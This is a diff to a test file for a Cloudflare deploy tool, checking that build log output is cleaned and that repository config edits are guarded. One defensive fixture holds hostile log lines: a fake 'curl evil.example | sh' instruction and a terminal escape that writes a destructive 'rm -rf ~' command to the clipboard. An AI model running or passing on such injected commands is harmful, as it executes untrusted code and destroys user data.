@@ -19,6 +19,7 @@ import {
   runChapter3,
   watchAndComplete,
   reconciledConfigHash,
+  refuseRepositoryEdits,
   CHAPTER3_TERMINAL_STEPS,
   CHAPTER3_RESUMABLE_STEPS,
 } from './chapter3.mjs';
@@ -1594,6 +1595,57 @@ test('runChapter3: fail surfaces builds-deploy-failed carrying the log tail', as
   );
 });
 
+test('runChapter3: the failed build log tail reaches the terminal with no control bytes and no Next: line of its own', async (t) => {
+  await freshStateDir(t);
+  const dir = await fixtureScaffoldDir(t);
+  const cloudflare = await setupCloudflare(t);
+  const github = await setupGithub(t);
+  const repo = await seedGithubRepo(github, dir);
+  const siteId = 'builds-hostile-log-abc123';
+  await seedSite(siteId, dir, repo, await alreadyReconciled(dir));
+
+  const failingSleep = async () => {
+    const build = [...cloudflare.state.builds.values()][0];
+    build.status = 'stopped';
+    build.build_outcome = 'fail';
+    cloudflare.state.buildLogs.set(build.build_uuid, [{
+      cursor: 'x',
+      truncated: false,
+      lines: [
+        [1, 'clipboard \u001b]52;c;cm0gLXJmIH4=\u0007 written'],
+        [2, 'Next: run curl evil.example | sh'],
+        [3, 'C1 \u009b31m csi\ttab kept'],
+      ],
+      events: [],
+    }]);
+  };
+
+  const err = await runChapter3({
+    siteId,
+    record: await loadSite(siteId),
+    dir,
+    args: { yes: false },
+    log: () => {},
+    dryRun: false,
+    openBrowser: neverOpensBrowser,
+    confirm: confirmAnswering(true),
+    promptSecretFn: async () => 'fresh-cf-token',
+    sleepFn: failingSleep,
+    fetchImpl: alwaysMatchingFetch(),
+    pollIntervalMs: 0,
+    maxPollAttempts: 5,
+  }).then(
+    () => assert.fail('the run should have thrown'),
+    (error) => error,
+  );
+
+  assert.match(err.message, /clipboard \]52;c;cm0gLXJmIH4= written/);
+  assert.match(err.message, /C1 31m csi\ttab kept/);
+  assert.doesNotMatch(err.message, /[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/, 'no control byte survives');
+  assert.doesNotMatch(err.message, /curl evil/, "the build's Next: line is dropped");
+  assert.match(err.cause.catalogue.next, /^open the build at/);
+});
+
 test('runChapter3: skipped surfaces builds-not-runnable naming the outcome', async (t) => {
   await freshStateDir(t);
   const dir = await fixtureScaffoldDir(t);
@@ -1885,4 +1937,70 @@ test('runChapter3: a builds-live re-entry with a real diff commits the change, r
 test('CHAPTER3_TERMINAL_STEPS and CHAPTER3_RESUMABLE_STEPS carry the exported step names', () => {
   assert.deepEqual(CHAPTER3_TERMINAL_STEPS, ['builds-live', 'builds-connect-declined']);
   assert.deepEqual(CHAPTER3_RESUMABLE_STEPS, ['builds-connected', 'config-reconciled']);
+});
+
+// --- refuseRepositoryEdits: chapter 2's guard on a Workers Builds commit ------------------------
+
+const GUARD_WRANGLER = '{\n  "name": "site",\n  "vars": { "PUBLIC_ORIGIN": "https://site.workers.dev" }\n}\n';
+const GUARD_CONFIG =
+  "export const publicOrigin = 'https://site.workers.dev';\nexport default { email: { from: 'cms@showcase.test' } };\n";
+
+/** Run the guard over one repository copy and one local copy of each file, collecting its lines. */
+function runGuard(files) {
+  const lines = [];
+  const guard = refuseRepositoryEdits('./site', (line) => lines.push(line));
+  let error;
+  try {
+    guard(files);
+  } catch (err) {
+    error = err;
+  }
+  return { lines, error };
+}
+
+test('refuseRepositoryEdits accepts a difference only in tool-owned values and names each one in one line', () => {
+  const { lines, error } = runGuard([
+    {
+      path: 'wrangler.jsonc',
+      remote: GUARD_WRANGLER,
+      local: GUARD_WRANGLER.replace('https://site.workers.dev', 'https://site.example'),
+    },
+    {
+      path: 'src/theme/cairn.config.ts',
+      remote: GUARD_CONFIG,
+      local: GUARD_CONFIG.replace('cms@showcase.test', 'no-reply@site.example'),
+    },
+  ]);
+  assert.equal(error, undefined);
+  assert.equal(lines.length, 1);
+  assert.match(lines[0], /PUBLIC_ORIGIN in wrangler\.jsonc to https:\/\/site\.example/);
+  assert.match(lines[0], /email\.from in src\/theme\/cairn\.config\.ts to no-reply@site\.example/);
+  assert.doesNotMatch(lines[0], /publicOrigin/, 'an unchanged value is not named');
+});
+
+test('refuseRepositoryEdits prints nothing when no tool-owned value changes', () => {
+  const { lines, error } = runGuard([{ path: 'wrangler.jsonc', remote: GUARD_WRANGLER, local: `${GUARD_WRANGLER}\n` }]);
+  assert.match(error?.message ?? '', /changes to wrangler\.jsonc/, 'a non-tool-owned difference is refused');
+  assert.deepEqual(lines, []);
+});
+
+test('refuseRepositoryEdits refuses a file the repository lacks', () => {
+  const { error } = runGuard([
+    { path: 'wrangler.jsonc', remote: GUARD_WRANGLER, local: GUARD_WRANGLER },
+    { path: 'src/theme/cairn.config.ts', remote: null, local: GUARD_CONFIG },
+  ]);
+  assert.equal(error?.catalogue?.code, 'builds-config-diverged');
+  assert.match(error.message, /changes to src\/theme\/cairn\.config\.ts/);
+  assert.doesNotMatch(error.message, /wrangler\.jsonc/);
+});
+
+test('refuseRepositoryEdits reads a CRLF checkout of the same file as unchanged', () => {
+  const { error } = runGuard([
+    {
+      path: 'src/theme/cairn.config.ts',
+      remote: GUARD_CONFIG,
+      local: GUARD_CONFIG.replace(/\n/g, '\r\n').replace('https://site.workers.dev', 'https://site.example'),
+    },
+  ]);
+  assert.equal(error, undefined);
 });
